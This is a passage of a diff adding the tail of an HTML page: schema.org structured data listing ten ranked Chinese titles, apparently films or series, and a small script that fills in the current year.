+      "itemListOrder": "https://schema.org/ItemListOrderDescending",
+      "numberOfItems": 10,
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "烈火追击"},
+        {"@type": "ListItem", "position": 2, "name": "青春录像带"},
+        {"@type": "ListItem", "position": 3, "name": "星际回响"},
+        {"@type": "ListItem", "position": 4, "name": "沉默的证词"},
+        {"@type": "ListItem", "position": 5, "name": "江湖旧梦"},
+        {"@type": "ListItem", "position": 6, "name": "暗巷回声"},
+        {"@type": "ListItem", "position": 7, "name": "长街故人"},
+        {"@type": "ListItem", "position": 8, "name": "汉江恋人"},
+        {"@type": "ListItem", "position": 9, "name": "山海少年团"},
+        {"@type": "ListItem", "position": 10, "name": "老板别开玩笑了"}
+      ]
+    }
+  ]
+}
+</script>
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
